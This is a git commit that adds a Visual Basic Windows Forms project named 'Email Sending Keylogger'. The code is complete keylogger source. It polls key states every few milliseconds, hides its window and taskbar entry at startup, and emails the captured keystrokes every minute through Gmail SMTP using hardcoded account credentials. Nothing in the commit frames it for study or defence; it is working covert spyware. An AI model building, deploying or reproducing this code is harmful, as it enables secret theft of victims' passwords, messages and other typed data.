2128c6ec42250f904efb06af84edcddab66f3538
Petar <34079554+ptrsploit@users.noreply.github.com>
2018-01-17 13:03:37 +0100

    Email Sending Keylogger

---
+++ EmailSendingKeylogger/EmailSendingKeylogger/Form1.Designer.vb
@@ -0,0 +1,65 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class Form1
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Me.logs = New System.Windows.Forms.TextBox()
+        Me.emailTimer = New System.Windows.Forms.Timer(Me.components)
+        Me.keyTimer = New System.Windows.Forms.Timer(Me.components)
+        Me.SuspendLayout()
+        '
+        'logs
+        '
+        Me.logs.Location = New System.Drawing.Point(12, 12)
+        Me.logs.Multiline = True
+        Me.logs.Name = "logs"
+        Me.logs.Size = New System.Drawing.Size(260, 237)
+        Me.logs.TabIndex = 0
+        '
+        'emailTimer
+        '
+        Me.emailTimer.Enabled = True
+        Me.emailTimer.Interval = 60000
+        '
+        'keyTimer
+        '
+        Me.keyTimer.Enabled = True
+        Me.keyTimer.Interval = 5
+        '
+        'Form1
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.ClientSize = New System.Drawing.Size(284, 261)
+        Me.Controls.Add(Me.logs)
+        Me.Name = "Form1"
+        Me.Text = "Form1"
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+
+    Friend WithEvents logs As TextBox
+    Friend WithEvents emailTimer As Timer
+    Friend WithEvents keyTimer As Timer
+End Class
---
+++ EmailSendingKeylogger/EmailSendingKeylogger/Form1.vb
@@ -0,0 +1,67 @@
+﻿Option Strict On
+
+Imports System.Net.Mail
+
+Public Class Form1
+    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Long) As Short
+    Private Sub emailTimer_Tick(sender As Object, e As EventArgs) Handles emailTimer.Tick
+        Try
+            Dim smptser As New SmtpClient
+            smptser.EnableSsl = True
+            smptser.Credentials = New Net.NetworkCredential("keyloggertestemail1@gmail.com", "keylogger007")
+            smptser.Port = 587
+            smptser.Host = "smtp.gmail.com"
+
+            Dim email As New MailMessage
+            email.From = New MailAddress("keyloggertestemail1@gmail.com", "kl")
+            email.To.Add("keyloggertestemail1@gmail.com")
+            email.Subject = ("keylogging data")
+            email.Body = logs.Text
+            smptser.Send(email)
+
+        Catch ex As Exception
+            Me.Close()
+        End Try
+    End Sub
+
+    Private Sub keyTimer_Tick(sender As Object, e As EventArgs) Handles keyTimer.Tick
+        Dim result As Integer
+        Dim i As Integer
+        Dim key As String
+
+        For i = 2 To 90
+            result = 0
+            result = GetAsyncKeyState(i)
+
+            If result = -32767 Then
+                key = Chr(i)
+                If i = 13 Then key = vbNewLine
+                Exit For
+            End If
+        Next
+
+        If key <> Nothing Then
+            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
+                logs.Text &= key
+            Else
+                logs.Text &= key.ToLower
+            End If
+        End If
+
+
+        If My.Computer.Keyboard.AltKeyDown AndAlso My.Computer.Keyboard.CtrlKeyDown AndAlso key = "A" Then
+            Me.Visible = True
+        End If
+    End Sub
+
+    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
+        logs.Text &= vbNewLine & "Stopped: " & Now & vbNewLine
+    End Sub
+
+    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
+        Me.ShowIcon = False
+        Me.ShowInTaskbar = False
+        Me.Visible = False
+        logs.Text &= vbNewLine & "Started: " & Now & vbNewLine
+    End Sub
+End Class
